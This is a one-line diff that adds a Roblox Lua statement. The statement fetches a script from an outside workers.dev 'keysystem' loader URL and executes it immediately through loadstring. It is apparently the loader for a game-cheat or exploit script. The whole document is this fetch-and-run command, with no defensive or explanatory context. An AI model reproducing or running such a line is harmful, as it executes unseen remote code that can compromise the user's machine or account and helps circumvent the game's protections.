@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://esclipse-keysystem.bhieu4225.workers.dev/loader"))()
